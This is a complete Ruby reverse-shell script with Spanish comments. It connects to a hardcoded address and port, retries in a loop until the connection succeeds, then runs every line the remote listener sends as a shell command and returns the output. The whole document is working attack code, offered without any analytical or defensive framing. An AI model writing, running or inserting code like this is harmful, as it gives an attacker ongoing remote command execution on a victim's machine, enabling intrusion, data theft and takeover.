
#REMOTE SHELL
require 'socket'
require 'open3'

RHOST = "192.168.1.82"
RPORT = "8080"

#Intentos de conexion

begin
	s = TCPSocket.new "#{RHOST}","#{RPORT}"
	s.puts "----Conexion establecida----"
rescue
	sleep 20
	retry
end

#Comandos

begin
	while line = s.gets
		Open3.popen2e("#{line}") do | stdin, stdout_and_stderr | 
			IO.copy_stream(stdout_and_stderr, s)
		end
	end
rescue
	retry
end
